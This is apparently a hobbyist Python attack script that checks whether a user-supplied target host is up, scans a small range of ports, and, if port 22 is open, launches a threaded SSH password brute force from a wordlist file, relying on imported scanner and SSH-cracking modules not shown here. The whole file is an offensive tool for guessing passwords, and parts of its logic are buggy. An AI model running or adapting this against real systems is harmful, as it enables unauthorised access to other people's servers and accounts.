import paramiko, sys, os, termcolor
import threading, time

from hostchecker.TargetAvailability import TargetAvailability
from scanport.PortScanner import PortScanner
from sshcracker.ConnectSSH import ConnectSSH
# Config
timeout_half_sec = 0.5
timeout_two_sec = 2
timeout_three_sec = 3
TCP_SYN_FLAG = 'S'
TCP_RST_FLAG = 'R'
stop_flag = 0
ssh_port = 22

target = input("Please add target: ")
# registered_Ports = range(1, 1023)
registered_Ports = range(15, 25)
open_ports = []

portscanner = PortScanner(target, timeout_half_sec, timeout_two_sec, TCP_RST_FLAG, TCP_SYN_FLAG)
targetAvailability = TargetAvailability()
connect_ssh = ConnectSSH(target, ssh_port, stop_flag)

targetAvailability.check_host_availible(target,timeout_three_sec)


def brut_force(port):
    with open(input_file, 'r') as file:
        for line in file.readlines():
            if stop_flag == 1:
                t.join()
                exit()
            password = line.strip()
            t = threading.Thread(target=connect_ssh.ssh_connect, args=(password, username))
            t.start()
            time.sleep(1)


if targetAvailability:
    print("Port scan start")
    for i in registered_Ports:
        status = portscanner.scan_potrs(i)
        if status:
            print(f"Open port {i}")
            open_ports.append(i)
print(f"List of open ports: {open_ports}")
print("Scan finished")

if 22 in open_ports:
    user_input = input('Do you want to atak ssh (yes/no): ')
    yes_choices = ['yes', 'y']
    no_choices = ['no', 'n']
    if user_input.lower() in yes_choices:
        host = target
        username = input('[+] SSH Username: ')
        input_file = input('[+] Passwords File: ')
        input_file = "pass/" + input_file
        print('\n')

        if not os.path.exists(input_file):
            print('[!!] That File/Path Does Not Exist')
            sys.exit(1)

        print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + ' * * *')
        print('\n')
        brut_force(22)
    elif user_input.lower() in no_choices:
        print('user typed no')
    else:
        print('Type yes or no')
